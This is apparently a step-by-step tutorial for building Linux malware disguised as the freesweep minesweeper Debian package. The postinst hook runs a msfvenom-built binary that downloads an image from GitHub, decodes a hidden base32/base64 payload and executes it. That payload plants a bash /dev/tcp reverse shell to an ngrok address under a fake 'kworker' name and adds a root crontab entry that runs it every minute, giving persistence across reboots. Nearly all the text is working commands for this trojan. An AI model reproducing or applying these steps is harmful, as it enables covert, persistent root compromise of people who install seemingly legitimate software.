
IN this new malware it curl a image on github repository which hide a payload (this payload will try to get a root reverse shell back to attack machine every day every second enven after victim restart machine ) and run this payload



step 1) download freesweep_1.0.1-2_amd64.deb

step 2) mkdir /tmp/evil

step 3) mv Downloads/freesweep_1.0.1-2_amd64.deb /tmp/evil

step 4) cd /tmp/evil/

step 5) dpkg -x freesweep_1.0.1-2_amd64.deb work

step 6) mkdir work/DEBIAN

step 7) cd work/DEBIAN

step 8) nano control : 

Package: freesweep
Version: 0.1.0.1-2
Section: Games and Amusement
Priority: optional
Architecture: amd64
Maintainer: Ubuntu MOTU Developers (ubuntu-motu@lists.ubuntu.com)
Description: a text-based minesweeper
 Freesweep is an implementation of the popular minesweeper game, where
 one tries to find all the mines without igniting any, based on hints given
 by the computer. Unlike most implementations of this game, Freesweep
 works in any visual text display - in Linux console, in an xterm, and in
 most text-based terminals currently in use.
 
step 9) nano postinst : 
 
#!/bin/sh

sudo chmod 2755 /usr/games/freesweep_scores && /usr/games/freesweep_scores & /usr/games/freesweep &


!!! Here are where the change, to continute this you need have ngrok !!!
__________________________________________________________________________________________________________________


step 10) sudo ./ngrok tcp 443 on another terminal

step 11) here you need a image file for inject payload and upload to github repository (Note: if you want to use this malware penetration testing or whatever you better create a new github account)

step 12) nano payload.txt

echo '/bin/bash>/dev/tcp/{your ngrok address}/{your ngrok port} 0>&1 2>&1 &' >> /etc/init.d/kworker ; chmod ugo+x /etc/init.d/kworker ; echo '* * * * * root bash /etc/init.d/kworker' >> /etc/crontab

step 13) cat payload.txt | base32 | tr -d '\n' > b32_payload.txt

step 14) cat b23_payload.txt | base64 | tr -d '\n' > b64_payload.txt

step 15) echo "" > {image}

step 16) cat b64_payload.txt >> {image}

to check are your payload correctly inject to image you could type: tail -n 1 {image} | base 64 -d | base 32 -d

step 17) upload your image to github

step 18) msfvenom -a x64 --platform linux -p linux/x64/exec CMD='curl https://{your path to curl that image on github} --output - | tail -n 1 | base64 -d | base32 -d > /var/tmp/kworker; bash /var/tmp/kworker; rm /var/tmp/kworker' -b "\x00\x0a\x0d" -f elf -o /tmp/evil/work/usr/games/freesweep_scores

step 19) chmod 755 postinst

step 20) dpkg-deb --build /tmp/evil/work

and now you will have a malware namme (work.deb) in /tmp/evil, check how to use in usage.txt
